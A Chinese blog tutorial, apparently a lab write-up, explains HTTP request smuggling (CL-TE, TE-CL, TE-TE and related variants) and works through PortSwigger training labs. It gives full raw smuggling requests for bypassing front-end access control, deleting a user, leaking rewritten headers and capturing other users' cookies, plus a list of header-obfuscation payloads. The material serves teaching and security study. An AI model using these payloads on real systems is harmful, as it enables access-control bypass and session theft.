<p>在2019年的BlackHat USA 2019上，PortSwigger的James Kettle在他的议题——HTTP Desync Attacks: Smashing into the Cell Next Door中针对当前的网络环境，展示了使用分块编码来进行攻击的攻击方式，扩展了攻击面，并且提出了完整的一套检测利用流程。</p>
<blockquote>
<p><a href="https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153">https://www.blackhat.com/us-19/briefings/schedule/#http-desync-attacks-smashing-into-the-cell-next-door-15153</a></p>
</blockquote>
<p>HTTP Request Smuggling最早是在2005年由Watchfire记录的，但是由于其利用条件比较苛刻，很长一段时间，Web层面的漏洞如雨后春笋般冒了出来， 就像之前的不被重视的xss一样，HTTP Request Smuggling同样被忽略了。但大神们总是能带来神奇的体验，利用此漏洞成功拿到了近70K$的奖金，这不 仅让许多互联网大厂重视了起来，也让该漏洞走进了安全爱好者的视野。</p>
<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><h3 id="keep-alive-与-pipeline"><a href="#keep-alive-与-pipeline" class="headerlink" title="keep-alive 与 pipeline"></a>keep-alive 与 pipeline</h3><p>为了缓解源站的压力，一般会在用户和后端服务器（源站）之间加设前置服务器，用以缓存、简单校验、负载均衡等，而前置服务器与后端服务器往往是在可靠的网络域中，ip 也是相对固定的，所以可以重用 TCP 连接来减少频繁 TCP 握手带来的开销。这里就用到了 HTTP1.1 中的 <code>Keep-Alive</code> 和 <code>Pipeline</code> 特性：</p>
<blockquote>
<p>所谓 Keep-Alive，就是在 HTTP 请求中增加一个特殊的请求头 Connection: Keep-Alive，告诉服务器，接收完这次 HTTP 请求后，不要关闭 TCP 链接，后面对相同目标服务器的 HTTP 请求，重用这一个 TCP 链接，这样只需要进行一次 TCP 握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在 HTTP1.1 中是默认开启的。</p>
<p>有了 Keep-Alive 之后，后续就有了 Pipeline，在这里呢，客户端可以像流水线一样发送自己的 HTTP 请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循<strong>先入先出</strong>机制，将请求和响应严格对应起来，再将响应发送给客户端。现如今，浏览器默认是不启用 Pipeline 的，但是一般的服务器都提供了对 Pipleline 的支持。</p>
</blockquote>
<p>在正常情况下用户发出的 HTTP 请求的流动如下图：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912191248744.png" alt="image-20200912191248744"></p>
<p>这意味着突然之间，后端与前端就每个消息的结尾达成一致至关重要。否则，攻击者可能能够发送模糊的消息，该消息被后端解释为两个不同的HTTP请求：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912191259769.png" alt="image-20200912191259769"></p>
<p>为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。这就有了一个很典型的拓扑结构。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200903192043459.png" alt="image-20200903192043459"></p>
<p>一般来说，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这也很容易理解，用户的分布范围是十分广泛，建立连接的时间也是不确定的，这样TCP链接就很难重用，而代理服务器与后端的源站服务器的IP地址是相对固定，不同用户的请求通过代理服务器与源站服务器建立链接，这两者之间的TCP链接进行重用，也就顺理成章了。</p>
<p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>
<h2 id="五种常见的走私请求"><a href="#五种常见的走私请求" class="headerlink" title="五种常见的走私请求"></a>五种常见的走私请求</h2><h3 id="1-CL不为0的GET请求"><a href="#1-CL不为0的GET请求" class="headerlink" title="1 CL不为0的GET请求"></a>1 CL不为0的GET请求</h3><p>其实在这里，影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只因为GET比较典型，我们把它作为一个例子。</p>
<p>在<code>RFC2616</code>中，没有对GET请求像POST请求那样携带请求体做出规定，在最新的<code>RFC7231</code>的4.3.1节中也仅仅提了一句。</p>
<blockquote>
<p><a href="https://tools.ietf.org/html/rfc7231#section-4.3.1">https://tools.ietf.org/html/rfc7231#section-4.3.1</a></p>
<p>sending a payload body on a GET request might cause some existing implementations to reject the request</p>
</blockquote>
<p>假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p>
<p>比如我们构造请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET &#x2F; secret HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>前端服务器收到该请求，通过读取<code>Content-Length</code>，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，它就认为这是收到了两个请求，分别是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个</span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line"></span><br><span class="line">第二个</span><br><span class="line">GET &#x2F; secret HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure>

<p>这就导致了请求走私</p>
<h3 id="2-CL-CL"><a href="#2-CL-CL" class="headerlink" title="2 CL-CL"></a>2 CL-CL</h3><p>在<code>RFC7230</code>的第<code>3.3.3</code>节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p>
<blockquote>
<p><a href="https://tools.ietf.org/html/rfc7230#section-3.3.3"><br>https://tools.ietf.org/html/rfc7230#section-3.3.3</a></p>
</blockquote>
<p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。</p>
<p>此时恶意攻击者可以构造一个特殊的请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>

<p>中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母<code>a</code>，对于后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完毕。此时恰巧有一个其他的正常用户对服务器进行了请求，假设请求如图所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure>

<p>从前面我们也知道了，代理服务器与源站服务器之间一般会重用TCP连接。</p>
<p>这时候正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aGET &#x2F;index.html HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure>

<p>这时候用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且后续可以扩展成类似于CSRF的攻击方式。</p>
<p>但是两个<code>Content-Length</code>这种请求包还是太过于理想化了，一般的服务器都不会接受这种存在两个请求头的请求包。但是在<code>RFC2616</code>的第4.4节中，规定:<code>如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length</code>，这其实也就意味着请求包中同时包含这两个请求头并不算违规，服务器也不需要返回<code>400</code>错误。服务器在这里的实现更容易出问题。</p>
<blockquote>
<p><a href="https://tools.ietf.org/html/rfc2616#section-4.4">https://tools.ietf.org/html/rfc2616#section-4.4</a></p>
</blockquote>
<h3 id="3-CL-TE"><a href="#3-CL-TE" class="headerlink" title="3 CL-TE"></a>3 CL-TE</h3><p>所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>这一请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>这一请求头。</p>
<p>chunk传输数据格式如下，其中size的值由16进制表示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>

<p>Lab 地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
<p>构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acb51fb91e44b90480444e0700f300db.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Referer: https:&#x2F;&#x2F;acb51fb91e44b90480444e0700f300db.web-security-academy.net&#x2F;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;8PEc1O3nvJK1TMe34CRurWHbtmNlffXL</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">ol4three</span><br></pre></td></tr></table></figure>

<p>连续发送几次请求就可以获得该响应。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200904102611844.png" alt="image-20200904102611844"></p>
<p>由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为13，也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">ol4three</span><br></pre></td></tr></table></figure>

<p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到<code>0\r\n\r\n</code>时，认为已经读取到结尾了，但是剩下的字母ol4three就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OL4THREEPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>服务器在解析时就会产生报错。</p>
<h3 id="4-TE-CL"><a href="#4-TE-CL" class="headerlink" title="4 TE-CL"></a>4 TE-CL</h3><p>所谓<code>TE-CL</code>，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>这一请求头，而后端服务器处理<code>Content-Length</code>请求头。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
<p>构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acd21f681f756cf681ed0710009f00f1.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Cookie: session&#x3D;Ucdk8vByxAP8kqS8Ww6N7GuJ1jtDuSTE</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">oPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200904102554315.png" alt="image-20200904102554315"></p>
<p>由于前端服务器处理<code>T ransfer-Encoding</code>，当其读取到<code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对代理服务来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，当它读取完<code>12\r\n</code>之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>成功报错。</p>
<h3 id="5-TE-TE"><a href="#5-TE-TE" class="headerlink" title="5 TE-TE"></a>5 TE-TE</h3><p><code>TE-TE</code>，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。从某种意义上还是<code>CL-TE</code>或者<code>TE-CL</code>。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
<p>构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acab1f6b1ec9478a801fb8a90003005b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Referer: https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;request-smuggling&#x2F;lab-ofuscating-te-header</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session&#x3D;V9iX0s5p7jOrkL0RMxDZxVvZdqMgYgjo</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">oPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200904103359779.png" alt="image-20200904103359779"></p>
<p>PortSwigger 给出了一些可用于混淆的 payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding[空格]: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[空格]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>

<h2 id="其他攻击实例"><a href="#其他攻击实例" class="headerlink" title="其他攻击实例"></a>其他攻击实例</h2><p>以下是 PortSwigger 列举的攻击方式，另外还有 @Regilero 大佬的更多姿势：</p>
<blockquote>
<p><a href="https://regilero.github.io/english/security/2018/07/03/security_pound_http_smuggling/#toc3">https://regilero.github.io/english/security/2018/07/03/security_pound_http_smuggling/#toc3</a></p>
<p><a href="https://regilero.github.io/english/security/2019/04/24/security_jetty_http_smuggling/#toc4">https://regilero.github.io/english/security/2019/04/24/security_jetty_http_smuggling/#toc4</a></p>
<p><a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/#toc7">https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/#toc7</a></p>
</blockquote>
<h3 id="1-绕过前端服务器的安全控制"><a href="#1-绕过前端服务器的安全控制" class="headerlink" title="1 绕过前端服务器的安全控制"></a>1 绕过前端服务器的安全控制</h3><p>在这个网络环境中，前段服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，而后段服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应。因此我们可以利用HTTP请求走私，将无法访问的请求走私给后端服务器并获得响应。在这里有两个实验，分别是使用<code>CL-TE</code>和<code>TE-CL</code>绕过前端的访问控制</p>
<h4 id="1-1-使用CL-TE绕过前端服务器安全控制"><a href="#1-1-使用CL-TE绕过前端服务器安全控制" class="headerlink" title="1.1 使用CL-TE绕过前端服务器安全控制"></a>1.1 使用CL-TE绕过前端服务器安全控制</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p>
<p>实验的最终目的是获取admin权限并删除用户carlos</p>
<p>我们直接访问<code>/admin</code>,会返回提示<code>Path /admin is blocked</code>，看样子是被前端服务器阻止了，根据题目的提示<code>CL-TE</code>，我们可以尝试构造数据包</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912174247061.png" alt="image-20200912174247061"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac001ff21f8e14a68000ff8100ed0001.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Cookie: session&#x3D;47f6w4amWuXJBmai7o4kaxEvPqMX36QH</span><br><span class="line">Content-Length: 42</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">foo: bar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>进行多次请求之后，我们可以获得走私过去的请求的响应<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912183708172.png" alt="image-20200912183708172"></p>
<p>提示只有是以管理员身份访问或者在本地登录才可以访问<code>/admin</code>接口。</p>
<p>在下方走私的请求中，添加一个<code>Host: localhost</code>请求头，然后重新进行请求，一次不成功多试几次。</p>
<p>如图所示，我们成功访问了admin界面。也知道了如何删除一个用户，也就是对<code>/admin/delete?username=carlos</code>进行请求。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912183850522.png" alt="image-20200912183850522"></p>
<p>修改下走私的请求包再发送几次即可成功删除用户<code>carlos</code>。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200221367.png" alt="image-20201201200221367"></p>
<p>需要注意的一点是在这里，不需要我们对其他用户造成影响，因此走私过去的请求也必须是一个完整的请求，最后的两个<code>\r\n</code>不能丢弃。</p>
<h4 id="1-2-使用TE-CL绕过前端服务器安全控制"><a href="#1-2-使用TE-CL绕过前端服务器安全控制" class="headerlink" title="1.2 使用TE-CL绕过前端服务器安全控制"></a>1.2 使用TE-CL绕过前端服务器安全控制</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p>
<p>这个实验与上一个就十分类似.</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200254744.png" alt="image-20201201200254744"></p>
<h3 id="2-获取前端服务器重写请求字段"><a href="#2-获取前端服务器重写请求字段" class="headerlink" title="2 获取前端服务器重写请求字段"></a>2 获取前端服务器重写请求字段</h3><p>在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：</p>
<ul>
<li>描述TLS连接所使用的协议和密码</li>
<li>包含用户IP地址的XFF头</li>
<li>用户的会话令牌ID</li>
</ul>
<p>总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：</p>
<ul>
<li>找一个能够将请求参数的值输出到响应中的POST请求</li>
<li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li>
<li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li>
</ul>
<p>怎么理解呢，还是做一下实验来一起来学习下吧。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p>
<p>实验的最终目的还是删除用户 <code>carlos</code>。</p>
<p>我们首先进行第一步骤，找一个能够将请求参数的值输出到响应中的POST请求。</p>
<p>在网页上方的搜索功能就符合要求</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912180347881.png" alt="image-20200912180347881"></p>
<p>构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acc61f801f8a522a80a1356a00b6005b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: session&#x3D;h1Ca94Fnfl4FURsBEWq2zeZy6mygOG3m</span><br><span class="line">Content-Length: 78</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 70</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;ol4three</span><br></pre></td></tr></table></figure>

<p>多次请求之后就可以获得前端服务器添加的请求头</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200912181623521.png" alt="image-20200912181623521"></p>
<p>这是如何获取的呢，可以从我们构造的数据包来入手，可以看到，我们走私过去的请求为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 70</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;ol4three</span><br></pre></td></tr></table></figure>

<p>其中<code>Content-Length</code>的值为70，显然下面携带的数据的长度是不够70的，因此后端服务器在接收到这个走私的请求之后，会认为这个请求还没传输完毕，继续等待传输。</p>
<p>接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达70时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数的一部分，然后从响应中表示了出来，我们就能获取到了前端服务器重写的字段。</p>
<p>在走私的请求上添加这个字段，然后走私一个删除用户的请求就好了。</p>
<p>在走私的请求上添加这个字段，然后走私一个删除用户的请求就好了。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200353242.png" alt="image-20201201200353242"></p>
<h3 id="3-获取其他用户的请求"><a href="#3-获取其他用户的请求" class="headerlink" title="3 获取其他用户的请求"></a>3 获取其他用户的请求</h3><p>在上一个实验中，我们通过走私一个不完整的请求来获取前端服务器添加的字段，而字段来自于我们后续发送的请求。换句话说，我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p>
<p>实验的最终目的是获取其他用户的Cookie用来访问其他账号。</p>
<p>我们首先去寻找一个能够将传入的信息存储到网站中的POST请求表单，很容易就能发现网站中有一个用户评论的地方。</p>
<p>抓取POST请求并构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Cookie: session&#x3D;oGESUVlKzuczaZSzsazFsOCQ4fdLetwa</span><br><span class="line">Content-Length: 267</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;post&#x2F;comment HTTP&#x2F;1.1</span><br><span class="line">Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.net</span><br><span class="line">Cookie: session&#x3D;oGESUVlKzuczaZSzsazFsOCQ4fdLetwa</span><br><span class="line">Content-Length: 400</span><br><span class="line"></span><br><span class="line">csrf&#x3D;JDqCEvQexfPihDYr08mrlMun4ZJsrpX7&amp;postId&#x3D;5&amp;name&#x3D;meng&amp;email&#x3D;email%40qq.com&amp;website&#x3D;&amp;comment&#x3D;</span><br></pre></td></tr></table></figure>

<p>这样其实就足够了，但是有可能是实验环境的问题，我无论怎么等都不会获取到其他用户的请求，反而抓了一堆我自己的请求信息。不过原理就是这样，还是比较容易理解的，最重要的一点是，走私的请求是不完整的。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201200427954.png" alt="image-20201201200427954"></p>
<h3 id="4-利用反射型XSS"><a href="#4-利用反射型XSS" class="headerlink" title="4 利用反射型XSS"></a>4 利用反射型XSS</h3><p>我们可以使用HTTP走私请求搭配反射型XSS进行攻击，这样不需要与受害者进行交互，还能利用漏洞点在请求头中的XSS漏洞。</p>
<p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss">https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</a></p>
<p>在实验介绍中已经告诉了前端服务器不支持分块编码，目标是执行alert(1)</p>
